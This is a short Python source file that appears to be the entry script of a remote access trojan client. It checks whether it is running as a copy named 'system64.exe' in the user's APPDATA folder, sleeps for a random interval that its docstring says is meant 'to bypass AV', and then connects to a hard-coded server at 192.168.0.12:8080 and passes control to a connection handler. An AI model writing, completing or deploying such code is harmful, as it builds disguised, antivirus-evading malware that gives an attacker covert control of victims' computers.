from core.connection import conn
from core.connection.handler import connection_handler
import os
import sys
import time
import random


def test_for_startup_app():
    """Checks if the current executable is the one copied to appdata directory, it is add  random delay to execution to bypass AV

    
    Returns:
        [type] -- [description]
    """    
    app_data = os.getenv("APPDATA")
    app_data_exe = app_data +"\\"+"system64.exe"
    exe_name = sys.executable
    if exe_name == app_data_exe:
        random_dur = random.randint(50,250)
        time.sleep(random_dur)
        return True
    else:
        return False


if __name__ == "__main__":
    test_for_startup_app()
    client = conn.Client("192.168.0.12", 8080)
    client.connect_with_server()
    connection_handler(client)
    client.close()